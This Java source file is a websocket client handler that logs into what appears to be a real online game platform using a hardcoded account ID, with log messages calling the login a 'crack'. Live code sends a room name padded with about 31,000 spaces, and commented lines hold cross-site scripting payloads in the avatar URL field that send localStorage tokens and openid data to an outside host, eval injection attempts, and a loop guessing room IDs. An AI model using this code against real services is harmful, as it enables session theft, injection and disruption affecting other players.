package io.gamioo.pomelo;

import com.zvidia.pomelo.websocket.OnHandshakeSuccessHandler;
import com.zvidia.pomelo.websocket.PomeloClient;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

/**
 * some description
 *
 * @author Allen Jiang
 * @since 1.0.0
 */
public class GameHandshakeSuccessHandler implements OnHandshakeSuccessHandler {
    private static final Logger LOGGER = LogManager.getLogger(GameHandshakeSuccessHandler.class);
    private GameClient gameClient;


    private OpenIdService service;


    public void init(GameClient client) {
        this.gameClient = client;
        service = new OpenIdService();
    }

    @Override
    public void onSuccess(PomeloClient client, JSONObject jsonObject) {

        this.gameClient.hearBeat();
        PlatformClient platformClient = new PlatformClient("https://lele8k.game1617.com", 16000);
        try {
            //String openId = service.generateId();
            String openId = "oxmtuw_GQXpDC5Ox9UhJxOBGznJM";
            Map<String, Object> map = new HashMap<>();
            map.put("group", "game80");
            map.put("playerid", openId);
            map.put("formid", "3");
            // map.put("url", "https://lele8k.game1617.com/index.html?mo=80&n_vn=3005369640&nvilele8k=1198956096&d1lele8k=10");
            map.put("url", "https://lele8k.game1617.com/?mo=80&n_vn=1662369640&nvilele8k=2656454532&d1lele8k=10&lele8k_co=021Tzn1w30&lele8k_co2=0IbY21YL3w3cmM0O0Tzn1i&7473=shsfx1");
            com.alibaba.fastjson.JSONObject ret = platformClient.get4https("/newapiex/getws.aspx", map);
            LOGGER.info("ret={}", ret);
            String signData = ret.getString("signdata");
            String ip = ret.getString("msg");
            String connectIp = ret.getString("wsip2");

            JSONObject entity = new JSONObject();
            // String id = service.generateId();
            //    entity.put("_id", id);
            //   entity.put("_id", "oxmtuw_GQXpDC5Ox9UhJxOBGznJM@ll2020");
            entity.put("_id", openId + "@ll2020");

            //oR9cD1lM5cuXYI-P6nhEE0rFLz40
            //  entity.put("_id", "oxmtuw2bSnGwlEC-IZGs7ftrvFaM@ll2020");
            // entity.put("_id", "oxmtuw8bSnGwlEC-IZGs7ftrvFaM@ll2020");


            //   entity.put("_id", "oxmtuw5BSnGwlEC-IZGs7ftrvFaM@ll2020");
            //   entity.put("_id", "oxmtuw_2GQXpDC5Ox9UhJxOBGznJM@ll2020");

            // entity.put("_id", "oxmtuw_GQXpDC5Ox9UhJxOBGznJM@ll2020");

            // entity.put("name", "鱼香Rose");
            entity.put("name", "\\u963f\\u9f99");
            //entity.put("name", "\\u20\\u20\\u20\\u20\\u20");//名字可以改
            //  entity.put("name", "\\u20\u1be4\u2075\u1d4d\\u28\ud83d\udcad");
            //  entity.put("name", "\u963f\u9f99\\u20\u1be4\u2075\u1d4d\\u20\ud83d\udcad");
            //     entity.put("name", "鱼香Rose");
            entity.put("sex", "1");
            //  String value = RandomStringUtils.random(99999999, " ");
            //           StringBuilder sb = new StringBuilder();
            // for (int i = 0; i < 15999999; i++) {
//            for (int i = 0; i < 199999999; i++) {
//                sb.append(" ");
//            }
//            String value = RandomStringUtils.randomAlphanumeric(9999);
//            value = MessageFormat.format("https://thirdwx.qlogo.cn/mmopen/vi_32/{0}/132", value);
//            entity.put("headurl", value);
//                eval("("+req.query.input+")");
//
//                console.log("spreadid:", "eval(console.debug(GlobalData.openid))")

            //   entity.put("headurl", "eval(\"console.debug(GlobalData.openid)\")");


            //  entity.put("headurl", "<script>var httpRequest = new XMLHttpRequest();httpRequest.open('GET', 'https://game.guanl.cn/132.jpg', true);httpRequest.send();</script>");
            // entity.put("headurl", "<script>alert(localStorage.getItem('ll2020openiddata2022'))</script>");
            //  entity.put("headurl", "'https://game.guanl.cn/9527/router/wechat/login.do?invitorId=188786&id='+egret.localStorage.getItem('ll2020openiddata2022')");
            //  entity.put("headurl", "https://game.guanl.cn/132.jpg");
            // entity.put("headurl", "https://game.guanl.cn/9527/router/wechat/login.do?jwt=JSON.stringify(localStorage)");
            //  entity.put("headurl", "?redirect_uri=https://163.com/login.do?jwt=+JSON.stringify(localStorage)");
            //   entity.put("headurl", "https://game.guanl.cn/router/common/exception.do?userId=0&detail=<script>xmlHttp = new XMLHttpRequest; xmlHttp.open('GET','https://game.guanl.cn/c.png',false); xmlHttp.send(); console.log(xmlHttp.responseText);</script>");


            //  entity.put("headurl", "https://thirdwx.qlogo.cn/mmopen/vi_32/y6E5GpvgQicwocia23oqIibpWBqEbCgny2JGsrAaCK1xSSPQbCXOzBZjN9iboicCqnQ1SHB3943qYZHibSWqAUpHdZ4A1/132");
            entity.put("headurl", "https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIrj8pKz1TFag7p4jz5AB7eialLmxHLiaC4xv2jw05aDkJo5W6iarBnEahA6cOIgxyG8HTib7dg1G0YGQ/132");


            entity.put("agentId", "454532");//这个可以改
            entity.put("formId", 3);
            entity.put("verison", "155");//每次版本更新都要改
            entity.put("ip", ip);
            entity.put("dis", 0);
            entity.put("smslogon", 0);
            entity.put("protocol", "https://");
            entity.put("hostname", "lele8k.game1617.com");
            entity.put("connectIP", connectIp);
            //  entity.put("passname", "31376101647185013682");


            //  entity.put("signname", "1647615887368.87");
            entity.put("signname", "ll2020");

            // entity.put("signname", this.signName);
            entity.put("signData", signData);
            entity.put("wsId", 2);
            client.request("connector.entryHandler.login", entity.toString(), message -> {
                JSONObject object = message.getBodyJson();
                int code = object.getInt("code");
                if (code == 200) {
                    LOGGER.info("user={}", object);
                    //  LOGGER.debug("破解成功 id={}", id);

                    int userId = object.getJSONObject("data").getJSONObject("player").getInt("userId");
                    StringBuilder sb = new StringBuilder("979532");

                    for (int i = 0; i < 30999; i++) {
                        sb.append(" ");
                    }
                    String other = sb.toString();
                    LOGGER.info("userId={}", userId);
                    //    for (int i = 0; i < 1000000; i++) {
                    gameClient.asyncCreateRoom(GameType.COMMON, other);


                    //   ThreadUtils.sleep(10);
                    //   }

                    // String prefix = "6217";
//                    String prefix = "5115";
//
//                    for (int i = 10; i < 100; i++) {
//                        if (!gameClient.isRoom()) {
//                            int roomId = Integer.parseInt(prefix + i);
//                            LOGGER.debug("尝试进入房间 roomId={}", roomId);
//                            gameClient.joinRoom(GameType.COMMON, roomId);
//                        } else {
//                            break;
//                        }
//
//                    }


                    //  gameClient.joinRoom(GameType.COMMON, 621740);
                } else {
                    LOGGER.debug("破解失败 id={}", openId);
                }


                //   gameClient.getUserInfo(373082);
                //  flag = true;


            });
        } catch (JSONException e) {
            LOGGER.error(e.getMessage(), e);
            this.gameClient.setFlag(true);

        }


    }
}
